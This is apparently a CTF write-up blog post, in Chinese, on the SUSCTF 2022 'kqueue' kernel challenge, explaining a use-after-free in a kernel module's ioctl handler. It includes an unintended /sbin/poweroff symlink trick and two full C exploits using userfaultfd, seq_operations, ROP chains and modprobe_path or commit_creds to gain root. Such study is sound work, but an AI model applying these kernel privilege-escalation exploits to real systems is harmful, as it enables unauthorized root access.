# susctf-2022-pwn-review



# susctf-2022-pwn 复现

很久没有做题了，找了最近的几次比赛试题复现一下。`xctf`的题目质量一向不错，首先复现一下`susctf2022`的所有`pwn`题。

<!-- more -->



## 4-kqueue

- 当控制了`rip`后，可以利用`pt_regs`结构体，然后使用`pop rsp; ret`这个`gadget`把栈迁移到用户地址空间，接着利用一些`gadgets`把`modprobe_path`修改为自定义路径

- `seq_operations`结构体控制后，当调用`read(fd, data, 0)`的时候，会先调`start`指针，然后调`show`指针，然后调`stop`指针

- 直接调用`swapgs_restore_regs_and_return_to_usermode`，从`mov rdi, cr3`处开始返回用户态，布局如下：

  ```
  swapgs_restore_regs_and_return_to_usermode+offset
  0
  0
  get_shell_address
  user_cs
  user_eflags
  user_sp
  user_ss
  ```



### 题目分析

首先修改启动脚本：

```bash
#!/bin/bash
set -ex

gcc exp2.c -o ./rootfs/home/ctf/exp2 -static -w
gcc exp.c -o ./rootfs/home/ctf/exp -static -w -lpthread

cd ./rootfs

find . | cpio -o --format=newc > ../rootfs.cpio

cd ..

stty intr ^] # 避免ctrl + c 结束qemu

fakeroot -- \
	qemu-system-x86_64 \
	-initrd rootfs.cpio \
	-kernel  bzImage\
	-append 'console=ttyS0 root=/dev/ram oops=panic panic=1 quiet nokaslr'  \ # 关闭kaslr
	-monitor /dev/null \
	-m 64M \
   	--nographic \
	-no-reboot \
	-smp cores=2,threads=2 \
	-cpu kvm64,+smep,smap  \
	-s # 开启调试端口

```



然后添加一个`gdb`脚本：

```shell
#!/bin/sh

gdb-multiarch ./vmlinux \
    -ex 'target remote 127.0.0.1:1234' \
    -ex 'add-symbol-file vmlinux 0xffffffff81000000' \
    -ex 'add-symbol-file kqueue.ko 0xffffffffc0000000' \
    -ex 'b *0xffffffffc0000058' \
```



并可以在`init`脚本中添加以方便调试：

```shell
cat /proc/kallsyms > /tmp/kallsyms
cat /sys/module/kqueue/sections/.text > /tmp/modules
cat /sys/module/kqueue/sections/.bss >> /tmp/modules
```



题目是一个循环链表，梳理出结构体如下：

```c
struct Queue
{
  Node *head;
  Node *tail;
  u64 num;
  u64 head_lock;
  char _1[24];
  u64 tail_lock;
};

struct Node
{
  u64 idx;
  char data[8];
  Node *next;
};

```

#### kqueue_init

模块初始化的时候，申请了`kmalloc-96`的`chunk`并给全局变量`queue`赋值，然后申请了一个`node`：

![image-20220629194137987](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220629194137987.png)

#### kqueue_ioctl

![image-20220629195844063](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220629195844063.png)

添加的时候从`tail`尾部添加，如果拷贝失败，就会释放申请的`node`。但是由于已经把`next`域给赋值了，所以这里存在一个`UAF`。

![image-20220629200020344](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220629200020344.png)

删除的时候，从头部删除，但是拷贝的是**下一个node的数据**。这个很重要。

总结一下流程就是：

![image-20220629201432118](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220629201432118.png)

### 利用思路

这题的附件有很大的`bug`，`/bin`目录以及`/sbin`对`ctf`用户都可以写。观察一下`init`脚本，发现结束后调用了`mount`命令和`poweroff`命令，所以只需要修改软连接为自定义脚本即可。

```c
#include <stdlib.h>

int main()
{
	system("mv /sbin/poweroff /sbin/poweroff.bk");
	system("echo '#!/bin/sh' > /tmp/poweroff");
	system("echo 'cat /flag' >> /tmp/poweroff");
	system("chmod +x /tmp/poweroff");
	system("ln -s /tmp/poweroff /sbin/poweroff");
	return 0;
}
```

然后输入`exit`退出的时候，可以直接获得`flag`。

![image-20220629193228160](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220629193228160.png)



说完非预期解，那么如果按照预期解法，思路如下：

- 因为存在`UAF`，所以当添加`node`的时候，传入一个非法地址使得`copy_from_user`失败，就能给`next`域赋值，然后使用`seq_operations`占位这个`chunk`，即可泄露出`kernel text`基地址。
- 然后两次释放`seq_operations`所在的`chunk`过程中，结合`userfaultfd`去修改`stop`指针为任意地址
- 结合`pt_regs`结构体，使用栈迁移修改`modprobe_path`即可读取`flag`

### EXP

```c
#define DEBUG 1
#include "helpful.h"

const char *DEV_NAME = "/dev/kqueue";
int g_fd, g_seq_fd;

extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
extern size_t g_vmlinux_base_addr;
extern size_t *g_buffer;
extern size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;
extern ssize_t g_process_userfault_running;

void add(void *data)
{   
    assert(g_fd > 0);
    ioctl(g_fd, 0x1314001, data);
}

void dele(void *data)
{
    assert(g_fd > 0);
    ioctl(g_fd, 0x1314002, data);
}

void prepare()
{
    bindcpu(0);
    save_status();
    prepare_for_modprobe_path("/tmp/aa");
    g_fd = open(DEV_NAME, O_RDWR);
    assert(g_fd > 0);
    success("prepare work done!");
}

void helper(void *page)
{
    // add rsp, 0x160; pop rbx; pop r12; pop r13; pop rbp; ret; 
    size_t gadget = GET_GADGET_REAL_ADDR(0xffffffff810494c5);
    memcpy(page, &gadget, 8);
    close(g_seq_fd);
    g_seq_fd = open("/proc/self/stat", O_RDONLY);
    info("now g_seq_fd is: %d", g_seq_fd);
    sleep(1);
}

void get_flag()
{
    system("/tmp/dummy");
    system("cat /flag");
    get_root_shell_ex();
}

void funcA(void *page)
{
    size_t data = 0;
    dele(&data);
    add(page);
}

void hacker()
{
    ssize_t seq;
    size_t data = 0;
    void *page = get_mmap_rw(0, PAGE_SIZE);
    register_userfault(page, &userfaultfd_stuck_handler, &helper, 0);

    info("try to leak kernel address.");
    add(0xdeadbeef);
    g_seq_fd = open("/proc/self/stat", O_RDONLY);
    dele(&data);
    g_vmlinux_base_addr = data - 0x10d4b0;
    assert(g_vmlinux_base_addr >> 56 == 0xff);
    info("leak kernel base address: 0x%lx", g_vmlinux_base_addr);

    info("try to change modprobe_path.");
    pthread_t tid;
    pthread_create(&tid, NULL, &funcA, page);
    g_process_userfault_running = 1;
    pthread_join(tid, NULL);
    int k = 0;
    g_buffer[k++] = GET_GADGET_REAL_ADDR(0xffffffff8107bd1d); // pop rdi; ret; 
    g_buffer[k++] = 0x61612f706d742f; // pop rdi; ret; 
    g_buffer[k++] = GET_GADGET_REAL_ADDR(0xffffffff8101d6b1); // pop rax; ret; 
    g_buffer[k++] = GET_GADGET_REAL_ADDR(0xffffffff81a2ad40); // modprobe_path
    g_buffer[k++] = GET_GADGET_REAL_ADDR(0xffffffff810cccd5); // mov qword ptr [rax], rdi; ret;
    g_buffer[k++] = GET_GADGET_REAL_ADDR(0xffffffff81400a65); // swapgs_restore_regs_and_return_to_usermode
    g_buffer[k++] = 0; 
    g_buffer[k++] = 0;
    g_buffer[k++] = (size_t)&get_flag; 
    g_buffer[k++] = g_user_cs; 
    g_buffer[k++] = g_user_eflags; 
    g_buffer[k++] = g_user_sp; 
    g_buffer[k++] = g_user_ss; 

    assign_all_regs();

    g_r8 = (size_t)g_buffer;
    g_r9 = GET_GADGET_REAL_ADDR(0xffffffff810953cc); // pop rsp; ret;
    g_rsi = g_r8;

    asm volatile(
        "mov %1, %%r9\n\t"
        "mov %2, %%r10\n\t"
        "mov %3, %%r11\n\t"
        "mov %4, %%r12\n\t"
        "mov %0, %%r8\n\t"
        "mov %5, %%r13\n\t"
        "mov %6, %%r14\n\t"
        "mov %7, %%r15\n\t"
        "mov %8, %%rbp\n\t"
        "mov %9, %%rsi\n\t"
        "mov %10, %%rbx\n\t"
        "mov $5, %%rdi\n\t"
        "mov $0, %%rdx\n\t"
        "mov $0, %%rax\n\t"
        "syscall\n\t"
        :
        : "r"(g_r8),"r"(g_r9),"r"(g_r10),"r"(g_r11),"r"(g_r12),"r"(g_r13),"r"(g_r14),"r"(g_r15),"r"(g_rbp),"r"(g_rsi),"r"(g_rbx)
        : "memory"
    );

}

void main()
{
    prepare();
    hacker();
}
```



还可以利用`commit_creds(preapare_cred(0))`来提升权限至`root`，使用`xchg esp, eax; ret`这一类的`gadget`即可。

```c
#define DEBUG 1
#include "helpful.h"

const char *DEV_NAME = "/dev/kqueue";
int g_fd, g_seq_fd;

extern size_t g_user_cs, g_user_ss, g_user_sp, g_user_eflags;
extern size_t g_prepare_kernel_cred_addr, g_commit_creds_addr;
extern size_t g_vmlinux_base_addr;
extern size_t *g_buffer;
extern size_t g_r15, g_r14, g_r13, g_r12, g_rbp, g_rbx, g_r11, g_r10, g_r9, g_r8, g_rdx, g_rcx, g_rax, g_rsi, g_rdi;
extern ssize_t g_process_userfault_running;

void add(void *data)
{   
    assert(g_fd > 0);
    ioctl(g_fd, 0x1314001, data);
}

void dele(void *data)
{
    assert(g_fd > 0);
    ioctl(g_fd, 0x1314002, data);
}

void prepare()
{
    bindcpu(0);
    save_status();
    prepare_for_modprobe_path("/tmp/aa");
    g_fd = open(DEV_NAME, O_RDWR);
    assert(g_fd > 0);
    success("prepare work done!");
}

void helper(void *page)
{
    // 0xffffffff810f95c7: xchg eax, esp; ret 0x24e9;
    size_t gadget = GET_GADGET_REAL_ADDR(0xffffffff810f95c7);
    memcpy(page, &gadget, 8);
    close(g_seq_fd);
    g_seq_fd = open("/proc/self/stat", O_RDONLY);
    info("now g_seq_fd is: %d", g_seq_fd);
    sleep(1);
}

void funcA(void *page)
{
    size_t data = 0;
    dele(&data);
    add(page);
}

void hacker()
{
    ssize_t seq;
    size_t data = 0;
    void *page = get_mmap_rw(0, PAGE_SIZE);
    register_userfault(page, &userfaultfd_stuck_handler, &helper, 0);

    info("try to leak kernel address.");
    add(0xdeadbeef);
    g_seq_fd = open("/proc/self/stat", O_RDONLY);
    dele(&data);
    g_vmlinux_base_addr = data - 0x10d4b0;
    assert(g_vmlinux_base_addr >> 56 == 0xff);
    info("leak kernel base address: 0x%lx", g_vmlinux_base_addr);
    g_prepare_kernel_cred_addr = GET_GADGET_REAL_ADDR(0xffffffff81055cb0);
    g_commit_creds_addr = GET_GADGET_REAL_ADDR(0xffffffff81055ae0);

    pthread_t tid;
    pthread_create(&tid, NULL, &funcA, page);
    g_process_userfault_running = 1;
    pthread_join(tid, NULL);

    size_t esp_addr = ((size_t)GET_GADGET_REAL_ADDR(0xffffffff810f95c7) & 0xffffffff);
    size_t *u_buffer = (size_t *)get_mmap_rw(esp_addr &~0xfff, 0x20000);
    assert(u_buffer != (void *)-1);
    *((size_t *)esp_addr) = GET_GADGET_REAL_ADDR(0xffffffff8107bd1d); // pop rdi; ret; 
    size_t *tmp = (size_t *)(esp_addr + 8 + 0x24e9);

    int k = 0;
    tmp[k++] = 0; // rdi
    tmp[k++] = g_prepare_kernel_cred_addr;
    tmp[k++] = GET_GADGET_REAL_ADDR(0xffffffff8122964c); // mov rdi, rax; pop r13; pop r14; mov rax, rdi; pop rbp; ret;
    tmp[k++] = 0;
    tmp[k++] = 0;
    tmp[k++] = (size_t)u_buffer + 0x10000;
    tmp[k++] = g_commit_creds_addr;
    tmp[k++] = GET_GADGET_REAL_ADDR(0xffffffff81400a65); // swapgs_restore_regs_and_return_to_usermode
    tmp[k++] = 0; 
    tmp[k++] = 0;
    tmp[k++] = (size_t)&get_root_shell_ex; 
    tmp[k++] = g_user_cs; 
    tmp[k++] = g_user_eflags; 
    tmp[k++] = g_user_sp; 
    tmp[k++] = g_user_ss; 

    read(g_seq_fd, &data, 0);

}

void main()
{
    prepare();
    hacker();
}
```

![image-20220630221315813](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220630221315813.png)



## 5-kqueue-revenge

有点奇怪，俩附件完全一样......

![image-20220630004500711](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220630004500711.png)

## 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2022-06-29-susctf-2022-pwn-review/  

